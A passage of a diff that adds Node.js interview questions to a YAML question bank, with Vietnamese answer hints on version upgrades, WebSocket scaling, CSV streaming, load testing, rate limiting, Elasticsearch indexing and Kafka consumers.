+      - **Checkpoint** (last processed key) lưu bền sau mỗi batch commit → restart tiếp tục từ checkpoint; xử lý **idempotent** (upsert/idempotency key) vì at-least-once.
+      - Lỗi từng record → DLQ/bảng lỗi, không dừng cả job; retry với backoff cho lỗi tạm thời.
+      - Chia partition theo key range để chạy song song nhiều worker; theo dõi throughput, lag, ETA.
+      - Graceful shutdown: dừng nhận batch mới, flush batch đang chạy, lưu checkpoint.
+    followUp: The external API allows 100 requests/second across all workers. How do you enforce it?
+    tags: [design, streams, batch]
+  - id: nodejs-055
+    level: senior
+    type: open
+    q: How would you run a Node major-version upgrade (e.g. 20 → 24) across 30 services?
+    hint: |-
+      - Inventory: version hiện tại, native addon (bcrypt, sharp, node-rdkafka...), base image, tool build/test.
+      - Đọc changelog/deprecation (vd thay đổi OpenSSL, `url.parse`, stream defaults, V8 flags); chạy test với `--pending-deprecation`/`--throw-deprecation` trên version cũ trước.
+      - CI matrix cả hai version; nâng service ít rủi ro trước; canary với so sánh metric (latency, memory, GC, error rate).
+      - Rủi ro ẩn: hành vi mặc định đổi (highWaterMark, fetch/undici, DNS family), memory profile khác.
+      - Tạo "golden path" (base image + template) để lần sau rẻ hơn; lịch upgrade gắn với LTS schedule.
+    followUp: Memory usage rose 15% after the upgrade with no code changes. How do you decide whether to roll back?
+    verify: true
+    tags: [upgrade, operations, open]
+  - id: nodejs-056
+    level: senior
+    type: design
+    q: Design a real-time price/notification push system on Node for 100k concurrent clients. What breaks first?
+    hint: |-
+      - Transport: WebSocket (Socket.IO hoặc `ws`) hoặc SSE nếu một chiều; SSE qua HTTP/2 đơn giản hơn với proxy.
+      - Scale ngang: nhiều node + pub/sub (Redis adapter, NATS, Kafka → fan-out) để broadcast; sticky session nếu có polling fallback.
+      - Điểm vỡ: memory mỗi connection (buffer), **slow consumer** (buffer ghi dồn — phải drop/disconnect theo `bufferedAmount`/`write()` false), fd limit, LB idle timeout (heartbeat/ping), reconnect storm sau deploy (jitter + backoff phía client).
+      - Ngữ nghĩa: at-most-once cho giá realtime; dữ liệu quan trọng cần resume bằng sequence/offset.
+      - Auth khi handshake + re-validate token hết hạn; giới hạn subscription theo tenant.
+    followUp: After a deploy, 100k clients reconnect within 5 seconds. How do you avoid melting the backend?
+    tags: [realtime, websocket, design]
+  - id: nodejs-057
+    level: cv
+    type: scenario
+    q: On a financial platform you fixed a CSV processing bottleneck. What exactly was slow, how did you prove it, and how did streams/backpressure fix it?
+    hint: |-
+      Câu trả lời mạnh có:
+      - Triệu chứng đo được: thời gian xử lý, memory peak, event loop bị block, timeout của request/job (điền số liệu thật của bạn — trước/sau).
+      - Nguyên nhân gốc: load cả file vào memory, parse đồng bộ, insert từng dòng/không giới hạn concurrency, hoặc thiếu index phía DB.
+      - Giải pháp: `pipeline` (read stream → CSV parser → validate/transform → batch insert), batch size và concurrency được chọn thế nào; xử lý dòng lỗi (report số dòng).
+      - Cách chứng minh: profile/metric trước và sau, load test với file thật cỡ production.
+      - Trade-off: all-or-nothing vs partial import, idempotency khi chạy lại file.
+    followUp: If the same file is uploaded twice by mistake, what prevents double-importing financial records?
+    redFlags:
+      - '"We just used streams and it got faster" with no mechanism or numbers'
+    tags: [cv, streams, csv]
+  - id: nodejs-058
+    level: cv
+    type: design
+    q: You built real-time features with Socket.IO on a financial platform. How did you handle multiple server instances, reconnection, and missed messages?
+    hint: |-
+      - Kiến trúc thật: số instance, có dùng Redis adapter/sticky session không, LB nào (điền chi tiết thật của bạn).
+      - Auth: xác thực khi handshake (token), room theo user/account, kiểm tra quyền khi join room.
+      - Reconnect: client tự reconnect với backoff; sau reconnect **đồng bộ lại state** (fetch snapshot hoặc gửi last sequence id) vì Socket.IO không đảm bảo giao message bị lỡ khi mất kết nối.
+      - Dữ liệu tài chính: realtime chỉ là "thông báo", nguồn sự thật vẫn là API/DB; tránh tính toán số dư dựa trên event push.
+      - Vấn đề gặp trong prod (memory, slow client, deploy làm rớt kết nối) và cách xử lý.
+    followUp: How did you load test the WebSocket layer, and what was the first bottleneck?
+    tags: [cv, socket-io, realtime]
+  - id: nodejs-059
+    level: cv
+    type: behavioral
+    q: You did unit and load testing on a Node/Express financial platform. Walk me through one load test that changed a design decision.
+    hint: |-
+      STAR:
+      - Situation: endpoint/flow nào, mục tiêu tải (RPS, concurrent users) lấy từ đâu.
+      - Task: SLO cần đạt (p95/p99 latency, error rate).
+      - Action: tool (k6/Artillery/JMeter), kịch bản thực tế (data đa dạng, think time), metric theo dõi phía server (event loop delay, CPU, heap, DB pool wait, slow query).
+      - Result: bottleneck tìm ra (vd pool DB, query thiếu index, JSON lớn, sync code) và thay đổi thiết kế (điền số liệu thật của bạn).
+      - Reflection: load test môi trường nào, khác production ra sao, lần sau làm gì khác.
+    followUp: How did you make sure the load test wasn't just measuring your own load generator's limits?
+    tags: [cv, load-testing, behavioral]
+  - id: nodejs-060
+    level: cv
+    type: design
+    q: Your Data Enrichment Service syncs product data from external providers. How did you control concurrency, timeouts, retries, and rate limits in Node?
+    hint: |-
+      - Concurrency giới hạn theo provider (p-limit/queue), không `Promise.all` trên toàn bộ danh sách.
+      - Timeout mỗi request (`AbortSignal.timeout`), retry chỉ lỗi tạm thời (5xx/429/network) với exponential backoff + jitter, tôn trọng `Retry-After`.
+      - Rate limit theo quota provider (token bucket, chia sẻ giữa nhiều instance qua Redis nếu cần).
+      - Idempotent upsert theo (tenant, provider, externalId) + version/hash để bỏ qua bản ghi không đổi.
+      - Lỗi dai dẳng → DLQ/bảng lỗi + alert; metric per provider (success rate, latency, lag).
+      - (điền kiến trúc thật: cron/queue/Kafka, số provider, volume)
+    followUp: One provider becomes very slow. How do you keep it from delaying the other providers' syncs?
+    tags: [cv, integration, resilience]
+  - id: nodejs-061
+    level: cv
+    type: design
+    q: For your Indexer Service that writes products into Elasticsearch, how did you batch and apply backpressure so neither Node nor the cluster fell over?
+    hint: |-
+      - Nguồn thay đổi: event (Kafka/queue) hay polling DB; đọc theo batch.
+      - Bulk API với batch theo **số document và/hoặc kích thước bytes**; concurrency bulk request giới hạn; xử lý **partial failure** trong bulk response (từng item lỗi), retry item 429 (`es_rejected_execution_exception`) với backoff.
+      - Backpressure: không đọc batch mới khi bulk đang chờ; consumer pause/resume.
+      - Full reindex: index mới + alias swap, tăng `refresh_interval` trong lúc reindex.
+      - Idempotent: document `_id` ổn định, version external để bỏ qua update cũ đến muộn.
+      - (điền số liệu thật: số document, thời gian reindex, batch size)
+    followUp: An update event for a product arrives before its create event. What does your indexer do?
+    tags: [cv, elasticsearch, backpressure]
+  - id: nodejs-062
+    level: cv
+    type: behavioral
+    q: Tell me about a production incident in a Node service where you had to debug across backend, database and frontend. How did you narrow it down?
+    hint: |-
+      STAR:
+      - Situation: triệu chứng người dùng thấy, mức độ ảnh hưởng (tenant nào, bao nhiêu request).
+      - Action: giả thuyết → dữ liệu kiểm chứng: log có requestId, trace, metric event loop/DB pool, slow query log/execution plan, network tab phía FE.
+      - Tách lớp: lỗi nằm ở FE (gửi request sai/lặp), BE (logic/timeout/pool), hay DB (lock, plan đổi, thiếu index).
+      - Fix ngắn hạn (mitigate) vs fix gốc; postmortem và biện pháp phòng ngừa (alert, test).
+      - (điền chi tiết/số liệu thật của bạn)
+      - Reflection: điều gì làm incident kéo dài và bạn đã cải thiện observability thế nào.
+    followUp: What single piece of telemetry would have cut your time-to-diagnosis in half?
+    tags: [cv, debugging, incident]
+  - id: nodejs-063
+    level: cv
+    type: design
+    q: When you split a monolith into Node/Express microservices using Kafka, how did you write the Node consumers — concurrency, offset commits, retries and shutdown?
+    hint: |-
+      - Client lib dùng thực tế (điền tên thật) và consumer group; partition key đảm bảo thứ tự theo entity.
+      - Xử lý: tuần tự trong partition, song song giữa partition; commit offset **sau** khi xử lý xong (at-least-once) → handler **idempotent** (dedupe theo event id).
+      - Retry: retry tại chỗ vài lần → retry topic có delay → DLQ; không block partition vô hạn vì một message lỗi (poison message).
+      - Chậm quá `session.timeout`/`max.poll.interval` → rebalance liên tục — nhận biết và xử lý.
+      - Shutdown: SIGTERM → dừng fetch, xử lý xong batch hiện tại, commit, disconnect.
+      - Metric: consumer lag theo partition, alert.
+    followUp: A consumer is stuck in a rebalance loop after you added a slow external call to the handler. Explain and fix.
+    verify: true
+    tags: [cv, kafka, microservices]
